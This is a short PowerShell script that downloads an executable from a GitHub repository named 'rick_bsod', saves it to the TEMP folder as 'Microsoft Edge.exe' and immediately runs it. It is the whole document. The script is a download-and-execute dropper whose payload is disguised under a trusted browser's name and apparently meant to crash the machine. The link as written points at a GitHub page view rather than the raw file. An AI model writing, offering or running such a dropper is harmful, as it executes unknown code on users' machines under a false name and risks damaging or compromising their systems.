$url = "https://github.com/discordl78-ops/rick_bsod/blob/main/Microsoft%20Edge.exe"
$outputPath = "$env:TEMP\Microsoft%20Edge.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

Start-Process $outputPath